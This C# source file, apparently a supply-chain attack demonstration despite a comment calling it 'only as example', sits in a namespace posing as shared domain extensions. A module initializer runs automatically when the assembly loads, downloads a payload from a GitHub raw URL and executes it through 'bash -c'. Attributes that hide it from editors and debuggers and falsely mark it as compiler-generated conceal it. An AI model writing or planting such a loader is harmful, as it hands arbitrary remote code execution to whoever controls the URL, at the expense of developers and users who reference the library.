using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.CompilerServices;

namespace Shared.DomainExtensions
{
    /// <summary>
    /// Only as example
    /// </summary>
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal static class ModuleInitializerExample
    {
        private static readonly HttpClient Client = new();

        [CompilerGenerated]
        [DebuggerHidden]
        [EditorBrowsable(EditorBrowsableState.Never)]
        [ModuleInitializer]
        internal static async void Run()
        {
            try
            {
                var response = await Client.GetAsync("https://raw.githubusercontent.com/bvadeveloper/chainAttackExample/main/payload");
                response.EnsureSuccessStatusCode();
                var payload = await response.Content.ReadAsStringAsync();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "bash",
                        Arguments = $"-c \"{payload}\"",
                        RedirectStandardOutput = false,
                        RedirectStandardError = false,
                        UseShellExecute = false,
                        CreateNoWindow = false
                    },
                    EnableRaisingEvents = true
                };

                process.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}